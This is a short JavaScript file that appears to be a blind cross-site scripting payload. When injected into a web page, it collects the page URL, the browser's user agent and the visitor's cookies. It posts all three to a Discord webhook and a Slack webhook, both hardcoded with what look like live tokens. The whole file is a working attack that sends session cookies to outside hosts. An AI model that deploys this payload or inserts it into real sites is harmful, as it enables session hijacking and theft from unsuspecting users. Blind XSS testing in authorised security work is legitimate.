(function() {
    // --- CONFIGURATION ---
    // Your webhook URLs are pasted below
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEl8DKf6DFSMJ6srVpn9_aErB37o';
    const slackWebhookUrl = 'https://hooks.slack.com/services/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';

    // --- DATA GATHERING ---
    const report = {
        title: "Blind XSS Fired!",
        url: document.location.href,
        userAgent: navigator.userAgent,
        cookies: document.cookie || 'Not Accessible'
    };

    // --- SENDER FUNCTIONS ---

    // 1. Send to Discord
    function sendToDiscord() {
        if (!discordWebhookUrl.startsWith('https://discord.com')) return;
        
        const embed = {
            title: report.title,
            description: `**Vulnerable URL:**\n\`\`\`${report.url}\`\`\``,
            color: 15158332, // Red color for high alert
            fields: [
                { name: "User Agent", value: `\`\`\`${report.userAgent}\`\`\`` },
                { name: "Cookies", value: `\`\`\`${report.cookies}\`\`\`` }
            ],
            footer: { text: "Custom Payload Notification" },
            timestamp: new Date().toISOString()
        };

        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    }

    // 2. Send to Slack
    function sendToSlack() {
        if (!slackWebhookUrl.startsWith('https://hooks.slack.com')) return;

        const textPayload = `*Blind XSS Fired!* :alert:\n\n*Vulnerable URL:*\n\`${report.url}\`\n\n*User Agent:*\n\`${report.userAgent}\`\n\n*Cookies:*\n\`${report.cookies}\``;
        
        fetch(slackWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text: textPayload })
        });
    }

    // --- EXECUTE ---
    sendToDiscord();
    sendToSlack();

})();
